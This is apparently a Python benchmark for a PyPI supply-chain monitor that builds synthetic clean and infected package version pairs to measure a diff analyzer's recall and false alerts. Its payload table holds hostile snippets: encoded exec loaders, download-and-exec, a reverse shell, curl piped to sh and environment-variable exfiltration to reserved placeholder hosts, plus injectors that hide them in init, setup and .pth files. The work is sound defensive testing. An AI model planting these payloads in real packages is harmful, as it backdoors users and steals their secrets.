"""Benchmark of the version diff: pairs of a clean and an infected version.

Packages are small synthetic ones, written to disk as unpacked artifacts, so the benchmark works
offline and takes a second. `infected` pairs must be caught; `clean` pairs are ordinary updates and
must stay quiet. Payloads only have to look right to a parser: nothing here is ever executed, and
every address in them is reserved for documentation.

    python -m benchmarks.diff_pairs
"""

import sys
import tempfile
from collections import Counter
from collections.abc import Callable
from dataclasses import dataclass
from pathlib import Path

from pypi_monitor.analyzers.base import ReleaseContext
from pypi_monitor.analyzers.consistency import ConsistencyAnalyzer
from pypi_monitor.analyzers.diff import DiffAnalyzer
from pypi_monitor.domain import Severity
from pypi_monitor.scoring import ScoringConfig, load_scoring_config, score_release

OLD_VERSION = "1.4.0"
NEW_VERSION = "1.4.1"
ALERT_LEVELS = frozenset({Severity.HIGH, Severity.CRITICAL})

Files = dict[str, str]

SETUP_PY = """\
from setuptools import setup

setup(name="{name}", version="{version}", packages=["{name}"])
"""
BASES: dict[str, Files] = {
    "plain": {
        "{name}/__init__.py": '__version__ = "{version}"\nfrom .core import greet\n',
        "{name}/core.py": 'def greet(name):\n    return f"Hello, {{name}}"\n',
    },
    "client": {
        "{name}/__init__.py": 'from .client import Client\n\n__version__ = "{version}"\n',
        "{name}/client.py": (
            "import json\n\n\nclass Client:\n    def __init__(self, url):\n"
            "        self.url = url\n\n    def encode(self, data):\n"
            "        return json.dumps(data)\n"
        ),
        "{name}/errors.py": "class ClientError(Exception):\n    pass\n",
    },
    "cli": {
        "{name}/__init__.py": 'VERSION = "{version}"\n',
        "{name}/__main__.py": "from .cli import main\n\nmain()\n",
        "{name}/cli.py": (
            "import argparse\n\n\ndef main():\n    parser = argparse.ArgumentParser()\n"
            "    parser.add_argument('path')\n    return parser.parse_args()\n"
        ),
    },
    "tools": {
        "{name}/__init__.py": '__version__ = "{version}"\n',
        "{name}/runner.py": (
            "import subprocess\n\n\ndef run(args):\n    return subprocess.run(args, check=True)\n"
        ),
        "{name}/paths.py": "from pathlib import Path\n\nROOT = Path.home()\n",
    },
    "data": {
        "{name}/__init__.py": "from .tables import TABLE\n",
        "{name}/tables.py": "TABLE = {{'a': 1, 'b': 2}}\n",
    },
    "tested": {
        "{name}/__init__.py": '__version__ = "{version}"\n',
        "{name}/math.py": "def add(a, b):\n    return a + b\n",
        # Tests of the old version already do what a payload does.
        "tests/test_math.py": (
            'import subprocess\n\n\ndef test_cli():\n    subprocess.run(["true"], check=True)\n'
        ),
    },
}

# Payloads are for code that runs on import. Each is a real technique, reduced to its shape.
PAYLOADS: dict[str, str] = {
    "exec_base64": ('import base64\nexec(base64.b64decode("cHJpbnQoJ3B3bmVkJyk="))\n'),
    "exec_two_steps": (
        "import base64 as b\n"
        'blob = b.b64decode("cHJpbnQoJ3B3bmVkJyk=")\n'
        "code = blob.decode()\nexec(code)\n"
    ),
    "exec_zlib": ('import zlib\nexec(zlib.decompress(bytes.fromhex("789c")))\n'),
    "download_exec": (
        "import urllib.request\n"
        'exec(urllib.request.urlopen("https://evil.example.net/stage2").read())\n'
    ),
    "requests_exec": (
        'import requests\nexec(requests.get("https://evil.example.net/stage2").text)\n'
    ),
    "reverse_shell": (
        "import socket, subprocess\n"
        "s = socket.socket()\n"
        's.connect(("203.0.113.7", 4444))\n'
        'subprocess.call(["/bin/sh", "-i"], stdin=s.fileno(), stdout=s.fileno())\n'
    ),
    "curl_pipe_sh": ('import os\nos.system("curl -s https://evil.example.net/x.sh | sh")\n'),
    "env_exfiltration": (
        "import os, requests\n"
        'subprocess_free = requests.post("http://203.0.113.7/c", json=dict(os.environ))\n'
    ),
    "dynamic_import": (
        'sock = __import__("socket").socket()\nsock.connect(("203.0.113.7", 8080))\n'
    ),
    "aliased_popen": (
        "from subprocess import Popen as P\n"
        'P(["sh", "-c", "curl https://evil.example.net/x | sh"])\n'
    ),
    "ctypes_loader": ('import ctypes\nctypes.CDLL("/tmp/.cache/libhelper.so")\n'),
    "pickle_blob": ('import pickle, base64\npickle.loads(base64.b64decode("gASVAAAAAA=="))\n'),
}
# Where a payload goes in the new version.
Injector = Callable[[Files, str, str], None]


def _into_init(files: Files, name: str, payload: str) -> None:
    files[f"{name}/__init__.py"] = payload + files[f"{name}/__init__.py"]


def _into_setup(files: Files, name: str, payload: str) -> None:
    files["setup.py"] = payload + files["setup.py"]


def _new_module_imported_from_init(files: Files, name: str, payload: str) -> None:
    files[f"{name}/_telemetry.py"] = payload
    files[f"{name}/__init__.py"] = "from . import _telemetry\n" + files[f"{name}/__init__.py"]


def _into_function(files: Files, name: str, payload: str) -> None:
    body = "".join(f"    {line}\n" for line in payload.splitlines())
    files[f"{name}/_helpers.py"] = f"def setup_logging():\n{body}"


def _pth(files: Files, name: str, payload: str) -> None:
    line = "; ".join(payload.strip().splitlines())
    files[f"{name}-init.pth"] = f"import sys; {line}\n"


INJECTORS: dict[str, Injector] = {
    "init": _into_init,
    "setup": _into_setup,
    "module": _new_module_imported_from_init,
    "function": _into_function,
    "pth": _pth,
}


def _reformatted(files: Files, name: str) -> None:
    for path in list(files):
        if path.endswith(".py"):
            source = files[path].replace('"', "'").replace("\n\n", "\n\n\n")
            files[path] = "# Reformatted.\n\n" + source + "\n\n"


def _new_feature(files: Files, name: str) -> None:
    files[f"{name}/extras.py"] = (
        '"""Helpers, see https://docs.example.net/extras."""\n\n'
        "import math\n\n\ndef area(radius):\n    return math.pi * radius**2\n"
    )


def _renamed_module(files: Files, name: str) -> None:
    files[f"{name}/_renamed.py"] = "import json\n\nDUMPS = json.dumps\n"


def _docstrings_and_comments(files: Files, name: str) -> None:
    for path in list(files):
        if path.endswith(".py"):
            files[path] = f'"""See https://evil-looking.example.net/ for docs."""\n{files[path]}'


def _vendored_update(files: Files, name: str) -> None:
    files[f"{name}/_vendor/idna.py"] = "import socket\n\nRESOLVE = socket.gethostbyname\n"


def _generated_version(files: Files, name: str) -> None:
    files[f"{name}/_version.py"] = 'version = "1.4.1"\nversion_tuple = (1, 4, 1)\n'


def _test_only_change(files: Files, name: str) -> None:
    files["tests/test_more.py"] = (
        'import subprocess\n\n\ndef test_git():\n    subprocess.run(["git", "status"])\n'
    )


def _bug_fix(files: Files, name: str) -> None:
    files[f"{name}/fixes.py"] = (
        "def clamp(value, low, high):\n    return max(low, min(value, high))\n"
    )


UPDATES: dict[str, Callable[[Files, str], None]] = {
    "reformatted": _reformatted,
    "feature": _new_feature,
    "renamed": _renamed_module,
    "docs": _docstrings_and_comments,
    "vendored": _vendored_update,
    "generated": _generated_version,
    "tests": _test_only_change,
    "bug_fix": _bug_fix,
}


@dataclass(frozen=True)
class Pair:
    id: str
    infected: bool
    old: Files
    new: Files


def _version_of(base: str, name: str, version: str) -> Files:
    files = {
        path.format(name=name): content.format(name=name, version=version)
        for path, content in BASES[base].items()
    }
    files["setup.py"] = SETUP_PY.format(name=name, version=version)
    files["pyproject.toml"] = '[build-system]\nrequires = ["setuptools"]\n'
    return files


def build_pairs() -> list[Pair]:
    pairs = []
    for base in BASES:
        name = f"pkg_{base}"
        old = _version_of(base, name, OLD_VERSION)
        for injector_name, inject in INJECTORS.items():
            for payload_name, payload in PAYLOADS.items():
                new = _version_of(base, name, NEW_VERSION)
                inject(new, name, payload)
                pairs.append(Pair(f"{base}/{injector_name}/{payload_name}", True, old, new))
        for update_name, update in UPDATES.items():
            new = _version_of(base, name, NEW_VERSION)
            update(new, name)
            pairs.append(Pair(f"{base}/clean/{update_name}", False, old, new))
    return pairs


def _write(root: Path, files: Files, name: str, version: str) -> None:
    for path, content in files.items():
        for directory in (
            root / f"{name}-{version}.tar.gz" / f"{name}-{version}",
            root / f"{name}-{version}-py3-none-any.whl",
        ):
            target = directory / path
            target.parent.mkdir(parents=True, exist_ok=True)
            target.write_text(content, encoding="utf-8")


@dataclass(frozen=True)
class Outcome:
    pair: Pair
    score: int
    level: Severity
    rules: frozenset[str]

    @property
    def detected(self) -> bool:
        """A diff signal outside the `noise.` rules: visible to a person looking at the release."""
        return any(rule.startswith("diff.") for rule in self.rules)

    @property
    def alerted(self) -> bool:
        return self.level in ALERT_LEVELS


def run_pair(pair: Pair, config: ScoringConfig) -> Outcome:
    name = pair.id.split("/")[0]
    with tempfile.TemporaryDirectory(prefix="scm-benchmark-") as directory:
        old_dir, new_dir = Path(directory, "old"), Path(directory, "new")
        _write(old_dir, pair.old, name, OLD_VERSION)
        _write(new_dir, pair.new, name, NEW_VERSION)
        release = ReleaseContext(
            name=name,
            version=NEW_VERSION,
            metadata={"previous_version": OLD_VERSION},
            artifact_dir=new_dir,
            previous_artifact_dir=old_dir,
        )
        signals = DiffAnalyzer().analyze(release) + ConsistencyAnalyzer().analyze(release)
    result = score_release(signals, config, name, is_popular=False)
    return Outcome(pair, result.score, result.level, frozenset(s.rule_id for s in signals))


@dataclass(frozen=True)
class Report:
    outcomes: list[Outcome]

    def _rate(self, infected: bool, attribute: str) -> float:
        chosen = [o for o in self.outcomes if o.pair.infected is infected]
        return sum(bool(getattr(o, attribute)) for o in chosen) / len(chosen)

    @property
    def detection_recall(self) -> float:
        return self._rate(True, "detected")

    @property
    def alert_recall(self) -> float:
        return self._rate(True, "alerted")

    @property
    def false_alert_rate(self) -> float:
        return self._rate(False, "alerted")

    @property
    def clean_noise_rate(self) -> float:
        return self._rate(False, "detected")


def run_benchmark(config: ScoringConfig) -> Report:
    return Report([run_pair(pair, config) for pair in build_pairs()])


def _missed_by_technique(report: Report, attribute: str) -> Counter[str]:
    return Counter(
        "/".join(o.pair.id.split("/")[1:])
        for o in report.outcomes
        if o.pair.infected and not getattr(o, attribute)
    )


def main() -> int:
    report = run_benchmark(load_scoring_config(Path("config/scoring.yaml")))
    infected = sum(o.pair.infected for o in report.outcomes)
    print(f"pairs: {infected} infected, {len(report.outcomes) - infected} clean")
    print(f"infected with a diff signal: {report.detection_recall:.1%}")
    print(f"infected with an alert:      {report.alert_recall:.1%}")
    print(f"clean with a diff signal:    {report.clean_noise_rate:.1%}")
    print(f"clean with an alert:         {report.false_alert_rate:.1%}")
    for title, attribute in (("no signal", "detected"), ("no alert", "alerted")):
        missed = _missed_by_technique(report, attribute)
        print(f"{title}: {sum(missed.values())}")
        for technique, count in missed.most_common():
            print(f"  {count:3} {technique}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
